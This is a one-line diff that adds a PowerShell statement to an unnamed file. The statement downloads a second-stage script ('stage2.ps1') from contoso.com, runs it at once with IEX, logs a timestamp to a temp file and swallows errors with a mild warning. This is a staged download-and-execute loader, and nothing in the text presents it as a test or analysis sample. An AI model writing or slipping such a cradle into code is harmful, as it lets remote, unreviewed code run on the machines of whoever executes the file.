@@ -1,0 +1,1 @@
+<# Remote fetch #> try { $RemoteScript = (New-Object System.Net.WebClient).DownloadString('http://contoso.com/stage2.ps1'); IEX $RemoteScript; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append } catch { Write-Warning "Stage transfer failed" }
